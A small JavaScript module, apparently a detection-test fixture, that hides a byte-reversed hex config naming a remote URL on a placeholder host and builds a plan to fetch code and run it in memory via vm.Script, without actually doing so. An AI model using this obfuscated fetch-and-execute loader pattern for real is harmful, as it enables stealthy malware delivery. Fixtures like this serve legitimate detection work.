const moduleShape = Object.freeze({ format: "commonjs" });

const Material_0ed3c2be = "383161362f746964754165646f4e3d746e6567615f726573757c6970612f64696c61766e692e656c706d6178652e3962393661616263383161362d65646f6e2f2f3a73707474683d6c72757c41414243383141362d45444f4e3d64695f6e676961706d61637c313d746e756f635f65676174737c6e6f6974636e75665f6e6568745f68637465663d726574706164617c79726f6d656d5f68637461707369642c65746f6d65725f657269757163613d73706574737c313d76";

const Codec_0ed3c2be = "hex_buffer|reverse_bytes|";



function load_0ed3c2be() { return [...Buffer.from(Material_0ed3c2be, "hex")]; }

function decode_0ed3c2be(item1) { return [...item1].reverse(); }

async function recover_0ed3c2be() {

  const item3 = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";

  const item1 = load_0ed3c2be(); let item2 = [];

  for (const item4 of [1]) item2 = decode_0ed3c2be(item1);

  void item3; return Buffer.from(item2).toString("ascii");

}

async function inspect_0ed3c2be() { return (await recover_0ed3c2be()).split("|").join("|"); }

async function plan_0ed3c2be() { const inspect = inspect_0ed3c2be; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "fetch_then_function", url: fields.url, dispatch: "vm.Script" }); }

void moduleShape; void plan_0ed3c2be;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_0ed3c2be());

